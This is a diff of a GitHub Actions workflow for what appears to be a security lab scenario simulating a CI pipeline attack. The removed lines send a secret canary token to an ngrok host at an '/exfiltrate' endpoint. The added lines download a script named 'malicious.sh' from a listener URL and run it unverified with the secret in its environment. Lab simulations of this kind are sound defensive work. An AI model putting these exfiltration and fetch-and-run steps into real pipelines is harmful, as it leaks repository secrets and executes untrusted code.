@@ -8,13 +8,11 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Simulate Remote Script Execution (A2)
+      - name: Fetch hosted uploader script
+        run: curl -sf -m 15 -o uploader.sh "${{ vars.LAB_LISTENER }}/vendor/malicious.sh"
+
+      - name: Run uploader (no verification)
         env:
           LAB_CANARY: ${{ secrets.LAB_CANARY }}
-        run: |
-          echo "Simulating dynamic script download and execution..."
-          # Simulating malicious script behavior piping environment/secrets out
-          PAYLOAD=$(printenv | base64)
-          curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
-            -H "Content-Type: application/json" \
-            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"A2\"}"
+          LAB_LISTENER: ${{ vars.LAB_LISTENER }}
+        run: bash uploader.sh
